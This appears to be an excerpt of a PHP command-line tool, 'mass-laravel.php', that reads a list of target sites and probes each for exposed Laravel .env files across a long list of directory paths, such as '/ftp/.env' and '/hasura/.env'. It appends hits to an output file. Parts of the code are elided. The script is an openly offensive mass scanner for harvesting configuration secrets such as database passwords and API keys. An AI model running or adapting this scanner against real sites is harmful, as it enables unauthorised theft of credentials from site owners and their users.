...
define("merah","\e[31m");
	class Laravel_Mass{
		public $url;
		public function save($saveas,$name){
			$result = fopen($name, "a+");
			fwrite($result,"$saveas\n");
			fclose($result);
		}
		public function CeklaraveENV(){
			$list = array('/__tests__/test-become/.env',
   '/_static/.env',
   ...
   '/ftp/.env',
   '/ftpmaster/.env',
   '/gists/cache/gists/laravel/gists/pusher/github-connect/.env',
   '/grems-api/.env',
   '/grems-frontend/.env',
   '/Hash/.env',
   '/hasura/.env',
   ...
   '/leafer-app/.env',
   '/ledger_sync/.env',
   '/legacy/tests/9.1.1/legacy/tests/9.2.0/legal/.env',
   ...
   '/zmusic-frontend/.env'
	...
	$ok = new Laravel_Mass();
	if(!isset($argv[1])){
		echo "USE : php mass-laravel.php list.txt";
		exit(1);
	}
	else {
		$link = $argv[1];
